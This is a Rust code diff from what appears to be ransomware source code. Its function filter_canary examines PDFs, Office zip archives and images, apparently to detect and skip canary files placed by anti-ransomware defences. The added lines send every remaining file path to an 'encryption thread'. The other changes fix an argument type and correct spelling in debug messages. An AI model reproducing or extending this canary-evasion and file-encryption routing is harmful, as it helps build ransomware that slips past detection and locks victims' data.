@@ -78,6 +78,8 @@ pub fn filter_canary(
             && IMAGE_EXTENSIONS.contains(&lowercase_extension.as_str())
         {
             filter_broken_image(&sender, &file_path);
+        } else if let Err(error) = sender.send(Arc::clone(&file_path)) {
+            error!("Failed to send path to encryption thread: {error}");
         }
     })
 }
@@ -85,7 +87,7 @@ pub fn filter_canary(
 fn filter_pdf(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>) {
     debug!("Analyzing file as a PDF: {file_path:?}");
 
-    let file_data = match get_file_data(file_path, &(MAX_FILE_SIZE_KB * 1024)) {
+    let file_data = match get_file_data(file_path, MAX_FILE_SIZE_KB * 1024) {
         Ok(data) => {
             debug!("No error during file data retrieval {file_path:?}");
             data
@@ -149,7 +151,7 @@ fn filter_office_zip(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>) {
 }
 
 fn filter_broken_image(sender: &Sender<Arc<PathBuf>>, file_path: &Arc<PathBuf>) {
-    let file_data = match get_file_data(file_path, &(MAX_IMAGE_SIZE_MB * 1024 * 1024)) {
+    let file_data = match get_file_data(file_path, MAX_IMAGE_SIZE_MB * 1024 * 1024) {
         Ok(data) => {
             debug!("No error during file data retrieval {file_path:?}");
             data
@@ -242,7 +244,7 @@ fn analyze_zip_file(
 ) -> Result<bool, ()> {
     let file = match File::open(file_path) {
         Ok(file) => {
-            debug!("Successfuly opened source file: {}", file_path.display());
+            debug!("Successfully opened source file: {}", file_path.display());
             file
         }
         Err(error) => {
@@ -254,7 +256,7 @@ fn analyze_zip_file(
     let mut archive = match ZipArchive::new(file) {
         Ok(archive) => {
             debug!(
-                "Successfuly opened file as zip archive: {}",
+                "Successfully opened file as zip archive: {}",
                 file_path.display()
             );
             archive
@@ -269,7 +271,7 @@ fn analyze_zip_file(
     for zipped_file_num in 0..archive.len() {
         let mut entry = match archive.by_index(zipped_file_num) {
             Ok(entry) => {
-                debug!("Successfuly opened zipped file: {:?}", entry.name());
+                debug!("Successfully opened zipped file: {:?}", entry.name());
                 entry
             }
             Err(error) => {
@@ -289,7 +291,7 @@ fn analyze_zip_file(
             match entry.read_to_end(&mut zipped_file_data) {
                 Ok(size) => {
                     debug!(
-                        "Successfuly read {} bytes from zipped file: {}",
+                        "Successfully read {} bytes from zipped file: {}",
                         size,
                         entry.name()
                     );
